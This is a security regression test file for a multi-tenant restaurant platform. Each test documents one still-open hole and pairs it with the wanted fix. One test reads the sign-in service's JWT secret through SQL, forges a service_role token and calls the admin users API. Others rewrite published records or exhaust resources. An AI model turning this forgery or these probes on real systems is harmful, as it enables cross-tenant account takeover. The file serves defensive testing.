// HOLES found by task G on 2026-11-21 and reported to the lead. None is in an ADR yet.
//
// Each test DOCUMENTS today's behaviour, so the suite stays green while the hole is open and
// turns red the day it is closed. When that happens: delete the test here and add the opposite
// test (the "wanted" line in each comment) to the real suite.
//
// Every attack is rolled back, except the one marked, which cleans up after itself.
import { createHmac } from "node:crypto";
import { beforeAll, describe, expect, it } from "vitest";
import { adminDb, apiDb, provisionStore } from "@rms/db";
import { type AskHandle, askAs, noOrgSql, orgSql, outcome, platform, refusal, storeSql } from "../helpers/actors.js";
import { EXTRA_ORG, ids } from "../helpers/world.js";

const a = ids("a");
let ask: AskHandle;

beforeAll(async () => {
  ask = await askAs("a");
});

describe("HOLE 1 (fix before real users): the sign-in service's signing secret is readable from inside the database", () => {
  const READ = "select current_setting('app.settings.jwt_secret', true) as s";

  it("HOLE: one SELECT through the Ask envelope returns it", async () => {
    // Wanted: null or empty for every restaurant role.
    // Today (local stack): a database-wide setting holds the secret the sign-in service signs with, and any role can read settings.
    // On the local stack the value is the well-known development default. Whether the hosted project has this
    // setting, with its real secret, is NOT verified: check it before the Ask tool runs there.
    const secret = String((await ask.query(READ)).rows[0]?.s ?? "");
    expect(secret.length).toBeGreaterThanOrEqual(32);
  });

  it("HOLE: the Data API role and the server login can read it too", async () => {
    expect(String((await storeSql("a", READ))[0]?.s ?? "").length).toBeGreaterThanOrEqual(32);
    expect(String((await noOrgSql(READ))[0]?.s ?? "").length).toBeGreaterThanOrEqual(32);
  });

  it("HOLE: with that secret, a forged service token is accepted by the local sign-in service's admin API", async () => {
    // This is why it matters: the admin API can list every user and reset any owner's password, so one
    // restaurant's Ask question becomes a sign-in as any other restaurant. One read-only request, local stack only.
    const secret = String((await ask.query(READ)).rows[0]?.s ?? "");
    const part = (o: object) => Buffer.from(JSON.stringify(o)).toString("base64url");
    const now = Math.floor(Date.now() / 1000);
    const body = `${part({ alg: "HS256", typ: "JWT" })}.${part({ role: "service_role", iss: "supabase-demo", iat: now, exp: now + 30 })}`;
    const forged = `${body}.${createHmac("sha256", secret).update(body).digest("base64url")}`;
    const res = await fetch(`${(process.env.SUPABASE_URL as string).replace(/\/$/, "")}/auth/v1/admin/users?page=1&per_page=1`, { headers: { apikey: forged, authorization: `Bearer ${forged}` } });
    await res.arrayBuffer();
    expect(res.status).toBe(200);
  });

  // The wall that does hold: RMS itself refuses a session token signed with that secret.
  // See tests/security/tokens/session.test.ts ("signed with the sign-in service's shared secret").
});

describe("HOLE 2 (fix before real users): the server login can rewrite a version after it is published", () => {
  it("HOLE: it can replace a published version's manifest, bundle and check results", async () => {
    // Wanted: 42501. A published version is what the Data API enforces and what the screens are served from.
    // Smallest fix: a restrictive UPDATE policy on platform.app_versions for rms_api, `using (status = 'draft') with check (status = 'draft')`.
    const rows = await orgSql(
      "a",
      `update platform.app_versions set manifest = '{"name":"Rewritten","models":[{"use":"sec_ledger","access":"write"}]}'::jsonb, bundle_key = 'bundles/unchecked', checks = '{"all":"passed"}'::jsonb
       where id = '${a.appVersion}' and status = 'published' returning id`,
    );
    expect(rows).toHaveLength(1);
  });

  it("the part that is closed: it cannot change the version's status", async () => {
    expect(await outcome(orgSql("a", `update platform.app_versions set status = 'published' where id = '${a.readOnlyAppVersion}'`))).toBe("42501");
  });
});

describe("HOLE 3 (fix before real users): the server login can reword a listing after it is listed", () => {
  it("HOLE: it can change the title and summary other restaurants see, with no new review", async () => {
    // Wanted: 42501 unless the listing is still a draft. The review is of the title and summary.
    // Smallest fix: a restrictive UPDATE policy on platform.listings for rms_api, `using (status = 'draft') with check (status = 'draft')`.
    const rows = await orgSql("a", `update platform.listings set title = 'Reworded after review', summary = 'Not what was approved' where id = '${a.listingPublic}' and status = 'listed' returning id`);
    expect(rows).toHaveLength(1);
  });
});

describe("HOLE 4 (fix before real users): a restaurant role can create large objects, and one of them stops the store from being dropped", () => {
  it("HOLE: the Data API role can create a large object (outside any table, outside row security)", async () => {
    // Wanted: refused. Same family as "extensions outside the envelope" in ADR 0004: it needs hostile SQL to reach the role.
    expect(await outcome(storeSql("a", "select lo_from_bytea(0, 'x')"))).toBe("allowed");
  });

  it("HOLE: the Ask login can create one too when it is not inside the envelope: a write by the read-only login", async () => {
    expect(await outcome(ask.readWrite("select lo_from_bytea(0, 'x')"))).toBe("allowed");
    expect(await outcome(ask.envelope("select lo_from_bytea(0, 'x')"))).toBe("25006"); // the envelope holds
  });

  it("HOLE: after a role has made one, platform.drop_store fails, so the demo reset would stop", async () => {
    // Wanted: drop_store succeeds. Smallest fix: `drop owned by <role>` for the three roles before `drop role` in platform.drop_store.
    // This is the one test that commits an attack. It uses a throwaway restaurant and removes the object again.
    const admin = adminDb();
    const role = `${EXTRA_ORG.prefix}_rw`;
    await admin`insert into platform.organizations (id, slug, name, store_prefix) values (${EXTRA_ORG.uuid}, ${EXTRA_ORG.slug}, ${EXTRA_ORG.name}, ${EXTRA_ORG.prefix})`;
    try {
      await provisionStore(admin, EXTRA_ORG.uuid);
      await apiDb().begin(async (tx) => {
        await tx.unsafe(`set local role ${role}`);
        await tx.unsafe("select lo_from_bytea(0, 'left behind by a restaurant role')");
      });
      const dropped = await refusal(admin`select platform.drop_store(${EXTRA_ORG.uuid})`);
      expect(dropped.code).toBe("2BP01"); // "role cannot be dropped because some objects depend on it"
    } finally {
      await admin.begin(async (tx) => {
        await tx.unsafe(`set local role ${role}`);
        await tx.unsafe("select lo_unlink(m.oid) from pg_largeobject_metadata m where m.lomowner = (select oid from pg_roles where rolname = current_user)");
      });
      await admin`select platform.drop_store(${EXTRA_ORG.uuid})`;
      await admin`delete from platform.organizations where id = ${EXTRA_ORG.uuid}`;
    }
    const [left] = await platform().unsafe(`select (select count(*)::int from pg_roles where rolname like '${EXTRA_ORG.prefix}%') as roles, (select count(*)::int from pg_namespace where nspname like '${EXTRA_ORG.prefix}%') as schemas`);
    expect(left).toEqual({ roles: 0, schemas: 0 });
  });
});

describe("HOLE 5 (fix before real users): an Ask answer is capped by rows, not by size", () => {
  it("HOLE: one row can carry 8 MB back to the server (and up to 1 GB is possible)", async () => {
    // Wanted: a byte budget for the whole result (for example 1 MB), enforced before the result is held in memory.
    // Smallest fix: read through a cursor in askQuery and stop at the budget; and have the Ask parser refuse repeat/lpad-style padding.
    const r = await ask.query("select repeat('x', 8000000) as big");
    expect(String(r.rows[0]?.big).length).toBe(8_000_000);
  });
});

// HOLE 6 (links not checked on restaurant and id) is documented next to the wall it belongs to:
// tests/security/db/fk-cross-org.test.ts, "links the list does not cover".
